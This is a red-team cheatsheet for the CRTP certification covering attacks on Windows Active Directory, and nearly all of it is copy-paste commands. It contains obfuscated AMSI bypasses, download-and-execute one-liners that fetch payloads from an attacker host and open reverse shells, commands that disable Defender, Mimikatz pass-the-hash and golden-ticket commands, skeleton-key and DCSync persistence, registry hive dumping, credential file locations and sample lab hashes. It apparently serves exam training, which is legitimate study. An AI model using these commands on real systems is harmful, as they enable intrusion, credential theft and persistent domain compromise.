# Cheatsheet for Certified Red Team Professional (CRTP) 

- [Cheatsheet for Certified Red Team Professional (CRTP)](#cheatsheet-for-certified-red-team-professional-crtp)
- [General](#general)
  - [PowerShell AMSI Bypass](#powershell-amsi-bypass)
  - [PowerShell One-liners](#powershell-one-liners)
  - [WMI Commands](#wmi-commands)
- [Enumeratiom](#enumeratiom)
  - [PowerView](#powerview)
    - [General](#general-1)
    - [ACL](#acl)
    - [Forest and trust](#forest-and-trust)
    - [OU](#ou)
    - [GPO](#gpo)
  - [Applocker](#applocker)
- [Lateral Movement](#lateral-movement)
  - [PowerView](#powerview-1)
  - [Derivative local admin loop](#derivative-local-admin-loop)
  - [Bloodhound](#bloodhound)
    - [Installing neo4j](#installing-neo4j)
  - [Kerberoasting](#kerberoasting)
    - [Automatic](#automatic)
    - [Manual](#manual)
    - [Make user kerberoastable by setting SPN](#make-user-kerberoastable-by-setting-spn)
  - [Token Manipulation](#token-manipulation)
    - [Invoke-TokenManipulation](#invoke-tokenmanipulation)
    - [Mimikatz](#mimikatz)
  - [Command execution with schtask](#command-execution-with-schtask)
  - [Command execution with WMI](#command-execution-with-wmi)
  - [Command executing with PowerShell Remoting](#command-executing-with-powershell-remoting)
- [Privilege Escalation](#privilege-escalation)
  - [PowerUp](#powerup)
- [Domain Persistence](#domain-persistence)
  - [Mimikatz skeleton key attack](#mimikatz-skeleton-key-attack)
  - [Domain Controller DSRM attack](#domain-controller-dsrm-attack)
  - [DCSync](#dcsync)
- [Post-Exploitation](#post-exploitation)
  - [Disable defender](#disable-defender)
  - [Juicy files](#juicy-files)
  - [Dumping secrets without Mimikatz](#dumping-secrets-without-mimikatz)
  - [Chisel proxying](#chisel-proxying)

# General

## PowerShell AMSI Bypass
Unhooking AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an AMSI bypass altogether by altering your scripts.


Plain AMSI bypass:
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Obfuscation example for copy-paste purposes:
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Another bypass, which is not detected by PowerShell autologging:
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)`
```

Bypass digitally signed:
```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
powershell -ep bypass
```

For more obfuscation, check Invoke-Obfuscation.

## PowerShell One-liners

Copy file:
```
Copy-Item -Path Invoke-MimikatzEx.ps1 -Destination \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files' Copy-Item [source] [dest]
```
Show file content
```
Get-Content \\computer.domain.local\c$\Users\test\file.txt
```
List network share:
```
ls \\computer.domain.local\c$ 
```
Show running processes with owner:
```
Get-Process -IncludeUserName
```
Download:
```
iex (iwr http://172.16.100.124/Tools/PowerView.ps1 -UseBasicParsing)
```
Download and execute:
```
powershell.exe iex (iwr http://172.16.100.124/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.4.101 -Port 443

powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.124/Toold/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.124 -Port 443
```

Encode:
```
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Encode existing script, copy to clipboard:
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip
```
Run it, bypassing execution policy.
```
Powershell -EncodedCommand $encodedCommand
```
If you have Nishang handy, you can use Invoke-Encode.ps1.

## WMI Commands
```
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

# Enumeratiom

## PowerView
### General
Get user current domain:
```
Get-NetUser | select -ExpandProperty cn
```
Get all computers in current domain:
```
Get-NetComputer
Get-NetForestDomain  
```
Get all user groups:
```
Get-NetGroup
```
Get Domain Admins attributes
```
Get-NetGroup -GroupName 'Domain Admins' -FullData
```
Get members of the Domain Admins group
```
Get-NetGroupMember -GroupName "Domain Admins" | select -ExpandProperty membername
Get-NetGroupMember -GroupName 'Domain Admins'   
```
Get members of the Enterprise Admins group
```
Get-NetGroupMember -GroupName 'Enterprise Admins'           
```
Since this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins, group is only present in the root of a forest.
```
Get-NetGroupMember -GroupName 'Enterprise Admins'-Domain moneycorp.local
```
Find shares in the domain, ignore default shares:
```
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

### ACL
Get incoming ACL for a specific object:
```
Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights
```
Enumerate ACL's for user/groups:
```
Get-ObjectAcl -SamAccountName [user/group] -ResolveGUIDs -Verbose
```
Get interesting outgoing ACLs for a specific user or group:
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Admins"} | select ObjectDN,ActiveDirectoryRights
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'Domain Admins'}         
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'students'}   
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match 'RDPUsers'}    
```


### Forest and trust
Get all domains in current forrest:
```
Get-NetForestDomain -Verbose
```
Map trust of current domain:
```
Get-NetDomainTrust  
```
Map all trusts of the current forest
```
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

```
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetDomainTrust -Verbose | ?{$_.TrustType -eq 'External'} 
Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
```


### OU
Enumerate OU's:
```
Get-NetOU
```
List all computers in an OU:
```
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```


### GPO
Get restricted GPO's:
```
Get-NetGPOProup -Verbose
```
Get GPO's
```
Get-NetGPO
```
Get GPOs applied to a specific OU:
```
Get-NetOU *student* | select gplink
Get-NetGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
```
Enumerate ACL's for GPO's:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```
Enumerate GPO's where [user/group] has interesting permissions:
```
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match 'Domain Admins'} 
```
Check for permissions on a specific group:
```
Get-NetOU StudentMachines -FullData
```
Use ADS path for following:
```
Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
```

## Applocker
Check for Applocker Constraint Language:
```
$ExecutionContext.SessionState.LanguageMode
```
Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at LOLBAS if only signed binaries are allowed.
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


# Lateral Movement

## PowerView
Find existing local admin access for user (noisy):
```
Find-LocalAdminAccess
```
Find local admin access over PS remoting (also noisy), requires Find-PSRemotingLocalAdminAccess.ps1
```
Get-NetComputer -Domain dollarcorp.moneycorp.local > .\targets.txt
Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355
```
Check for local admin access from user to other host and if PS remoting port is open:
```
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
Hunt for sessions of interesting users on machines where you have access (still noisy):
```
Invoke-UserHunter -CheckAccess | ?{$_.LocalAdmin -Eq True }
```
Look for kerberoastable users:
```
Get-DomainUser -SPN | select name,serviceprincipalname
```
Look for AS-REP roastable users
```
Get-DomainUser -PreauthNotRequired | select name
```
Look for users on which we can set UserAccountControl flags
If available - disable preauth or add SPN:
```
Get-DomainComputer -Unconstrained
```
Look for users or computers with Constrained Delegation enabled
If available and you have user/computer hash, access service machine as DA:
```
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

## Derivative local admin loop
Escalate to domain admin using derivative local admin.

Get local admin and active sessions:
```
. .\PowerView.ps1
Invoke-UserHunter -CheckAccess
Find-LocalAdminAccess
```
Create PSSession and disable security:
```
$sess = New-PSSession -ComputerName dcorp-svcadmin.dollarcorp.moneycorp.local
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession $sess
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

exit
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession $sess
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
Use krbtgt hash to create a golden ticket.

Download/copy and invoke Mimikatz:
```
Copy-Item -Path Invoke-MimikatzEx.ps1 -Destination \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
Invoke-MimikatzEx.ps1

iex (iwr http://172.16.100.124/Tools/Invoke-Mimikatz.ps1 -UseBasicParsing)
Invoke-Mimikatz
```
From elevated shell:
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```
Loop with elevated privileges!


## Bloodhound
Use Invoke-BloodHound from SharpHound.ps1, or use SharpHound.exe. Both can be ran reflectively.

Run all checks if you don't care about OpSec:
```
Invoke-BloodHound -CollectionMethod All 
```
Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts:
```
Invoke-BloodHound -CollectionMethod LoggedOn
```

### Installing neo4j
```
neo4j.bat install-service
neo4j.bat start

Browse to http://localhost:7474
Enter the username: neo4j and password: neo4j.
```

## Kerberoasting
### Automatic
With PowerView:
```
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
And crack the hash with hashcat:
```
hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```
### Manual
Request TGS for kerberoastable account (SPN):
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```
Dump TGS to disk:
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
Crack with TGSRepCrack:
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

### Make user kerberoastable by setting SPN
We need ACL permissions to set UserAccountControl flags for said user, see above for hunting. Using PowerView:
```
Set-DomainObject -Identity support355user -Set @{serviceprincipalname='any/thing'}
```

## Token Manipulation

Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.

Incognito
Show tokens on the machine:
```
.\incognito.exe list_tokens -u
```

Start new process with token of a specific user:
```
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

If you're using Meterpreter, you can use the built-in Incognito module with use incognito, the same commands are available.


### Invoke-TokenManipulation
Show all tokens on the machine:
```
Invoke-TokenManipulation -ShowAll
```

Show only unique, usable tokens on the machine:
```
Invoke-TokenManipulation -Enumerate
```

Start new process with token of a specific user:
```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

Start new process with token of another process:
```
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

### Mimikatz
Overpass the hash:
```
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'`
```

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:ff46a9d8bd66c6efd77603da26796f35 /run:powershell.exe"'
```

Golden ticket (domain admin, w/ some ticket properties to avoid detection):
```
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

Silver ticket for a specific SPN with a compromised service/machine account:
```
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

HOST:
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:[ntlm hash dcorp-dc] /user:Administrator /ptt"'`

RPCSS:
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:[ntlm hash dcorp-dc] /user:Administrator /ptt"'
```

List of available SPNs for silver tickets: https://adsecurity.org/?page_id=183


## Command execution with schtask
(requires 'Host' SPN)

To create a task:
Mind the quotes. Use encoded commands if quoting becomes a pain.
```
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
```

To trigger it:
```
schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local
```


## Command execution with WMI
(requires 'Host' and 'RPCSS')

From Windows:
```
Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell.exe -e $encodedCommand"
```

From Linux:
```
With password
impacket-wmiexec dcorp/student355:password@172.16.4.101

With hash
impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54
```


## Command executing with PowerShell Remoting
(requires 'HTTP' SPN (and 'HOST' and/or 'WSMAN'?))
This one is a bit tricky. I found it to work the least of the listed methods, a combination of the above SPNs may or may not work - also PowerShell may require the exact FQDN to be provided.

Create credential as another user (if needed):
```
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CORP\pgibbons', $SecPassword)
```
Run a command remotely (can be used one-to-many!):
```
Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock {whoami; hostname}
```
Launch a session as another user (prompt for password):
```
Enter-PSSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator
```
Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt:
```
$sess = New-PsSession -Credential $Cred
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess
```
PRO TIP: You can copy files into a PowerShell remoting session as follows:
```
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination "C:\Users\dbprodadmin\documents\"
```

# Privilege Escalation
## PowerUp
PowerUp
Enumerate all services with Unquoted Path:
```
Get-ServiceUnquoted
```
Enumerate services where the urrent user can make changes to service binary (look for CanRestart?):
```
Get-ModifiableServiceFile -Verbose
```
Enumerate services with weak permissions:
```                                          
Get-ModifiableService
```
Check for vulnerable programs and configs:
```
Invoke-AllChecks
```                                                                    

Exploit vulnerable service permissions (does not require touching disk):
```
Add user to local admins group:
Invoke-ServiceAbuse -Name '[servicename]' -UserName 'dcorp\student124'    

Add user:      
Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net localgroup Administrators domain\user /add"		
```
Exploit vulnerable service permissions to trigger stable beacon:
```
Write-ServiceBinary -Name 'AbyssWebServer' -Command 'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update' -Path 'C:\WebServer\Abyss'
net stop AbyssWebServer
net start AbyssWebServer
```

# Domain Persistence
## Mimikatz skeleton key attack
Run from DC. Enables password "mimikatz" for all users (noisy).
```
privilege::debug
misc::skeleton
```
Or:
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```
Use Enter-PSSession to access any many as any user untill the DC is restarted.
```
Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
```

## Domain Controller DSRM attack
The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first:
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
Now we can login remotely using the local admin hash dumped on the DC before (with lsadump::sam, see 'Dumping secrets with Mimikatz'). Use e.g. 'overpass the hash' to get a session (see 'Mimikatz' above).

## DCSync
Check replication rights:
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
Grant specific user DCSync rights with PowerView:
```
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student124 -Rights DCSync -Verbose
```
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Post-Exploitation
## Disable defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## Juicy files
There are lots of files that may contain interesting information. Tools like WinPEAS or collections like PowerSploit may help in identifying juicy files (for privesc or post-exploitation).
Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.

In addition, don't forget to enumerate any local databases with sqlcmd or Invoke-SqlCmd!

All user folders
Limit this command if there are too many files ;)
```
tree /f /a C:\Users
```
Web.config
```
C:\inetpub\www\*\web.config
```
Unattend files
```
C:\Windows\Panther\Unattend.xml
```
RDP config files
```
C:\ProgramData\Configs\
```
Powershell scripts/config files
```
C:\Program Files\Windows PowerShell\
```
PuTTy config
```
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty
```
FileZilla creds
```
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml
```
Jenkins creds (also check out the Windows vault, see above)
```
C:\Program Files\Jenkins\credentials.xml
```
WLAN profiles
```
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml
```
TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
```
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
```

## Dumping secrets without Mimikatz
On target:
```
reg.exe save hklm\sam c:\users\public\downloads\sam.save
reg.exe save hklm\system c:\users\public\downloads\system.save
reg.exe save hklm\security c:\users\public\downloads\security.save
```

On attacker Linux machine:
```
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out
```
## Chisel proxying
Just an example on how to set up a Socks proxy to chisel over a compromised host.

On attacker machine (Linux or Windows):
```
./chisel server -p 8888 --reverse
```

On target:
```
.\chisel_windows_386.exe client 10.10.16.7:8888 R:8001:127.0.0.1:9001
```

Now we are listening on localhost:8001 on our attacking machine to forward that traffic to target:9001.
Then, open the Socks server. On target:
```
.\chisel_windows_386.exe server -p 9001 --socks5
```

On attacking machine:
```
./chisel client localhost:8001 socks
```